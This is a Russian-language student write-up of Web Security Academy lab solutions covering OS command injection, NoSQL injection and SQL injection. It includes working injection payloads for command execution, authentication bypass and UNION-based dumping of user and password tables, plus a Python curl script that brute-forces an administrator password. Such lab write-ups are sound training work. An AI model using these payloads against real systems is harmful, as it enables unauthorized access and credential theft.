# Отчет по решению OS injection

## 1. Lab: OS command injection, simple case

Пошарился по лабе со включенным burp proxy, нашел post /product/stock, заинджектил в пост запрос `productId=2&storeId=1;whoami`

## 2. Lab: Blind OS command injection with time delays

В форме feedback можно поинжектить в поле email

` csrf=CvglT8HVqqhEjwmMgG9Z00uYphRnukWL&name=alaska&email=qwe%40ru.ru;sleep%2010;&subject=alaska&message=alaska`

## 3. Lab: Blind OS command injection with output redirection

Инжект находится в том же месте, где раньше, вывод можно посмотреть по пути /image?filename=who.txt

# Отчет по решению NoSQL

## 1. Lab: Detecting NoSQL injection

Инжект производится такой строкой
```
https://0a8b009a035541b580d0a832008f0051.web-security-academy.net/filter?category=Gifts%27||1||%27
```


## 2. Lab: Exploiting NoSQL operator injection to bypass authentication
```
{"username":{
"$regex": "admin.*"},"password":{
"$ne":""}
}
```


## 3. Lab: Exploiting NoSQL injection to extract data

Нашел ручку /user/lookup, написал переборный скрипт

```
import subprocess

for i in range(30):

    result = subprocess.check_output(f"curl \"https://0a29004103d5c93c81b761b500610098.web-security-academy.net/user/lookup?user=administrator'+%26%26+this.password.length=='{i}\" -b \"session=gGfRWGzVNbFPkaRpdmbdDb6mU7GE1vyy\"",
                                         shell=True, stderr=subprocess.DEVNULL).decode()
    resfind = result.find("Could not find user")
    if resfind == -1:
        pass_len=i


print(pass_len)
alphabet="abcdefghijklmnopqrstuvwxyz"
pass_us = ""
for i in range(pass_len):
    for j in alphabet:
        result = subprocess.check_output(f"curl \"https://0a29004103d5c93c81b761b500610098.web-security-academy.net/user/lookup?user=administrator'+%26%26+this.password%5b{i}%5d+%3d%3d+'{j}\" -b \"session=gGfRWGzVNbFPkaRpdmbdDb6mU7GE1vyy\"",
                                         shell=True, stderr=subprocess.DEVNULL).decode()

        resfind = result.find("Could not find user")
        if resfind == -1:
            pass_us+=j
            print(pass_us)
            continue

```

# Отчет по решению SQL injection

## 1. Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

Нашел, что в url параметрах в запросе при поиске пятисотит при вставке '1=1--

```
https://0aac002e042225ac814c524600eb0023.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories%271=1--
```

Добавил туда OR и решил

## 2. Lab: SQL injection vulnerability allowing login bypass

В пароль вставил peter'+OR+1=1--

## 3. Lab: SQL injection attack, querying the database type and version on Oracle

Поигрался со строкой url и информацией из шпоры 

```
/filter?category=Clothing%2c+shoes+and+accessories'+UNION+SELECT+banner,+null+FROM+v$version--
```

## 4. Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

То же что и в прошлом пункте

```
GET /filter?category=Clothing%2c+shoes+and+accessories%27+UNION+SELECT+@@version,+null#
```

## 5. Lab: SQL injection attack, listing the database contents on non-Oracle databases

При помощи information_schema узнал название таблиц и столбцов, а далее

```
/filter?category=Food+%26+Drink'+UNION+SELECT+username_zlsgld,+password_pdgcrz+FROM+users_inrtyt-- 
```

## 6. Lab: SQL injection attack, listing the database contents on Oracle

Тут уже было all_tab_columns и all_tables

```
Pets'+UNION+SELECT+USERNAME_QPCQFG,+PASSWORD_SUWKHT+FROM+USERS_OUTBIY--
```

## 7. Lab: SQL injection UNION attack, determining the number of columns returned by the query

Написал переборный скрипт (lab7.py) и нашел, что нужное количество колонн в запросе - 3
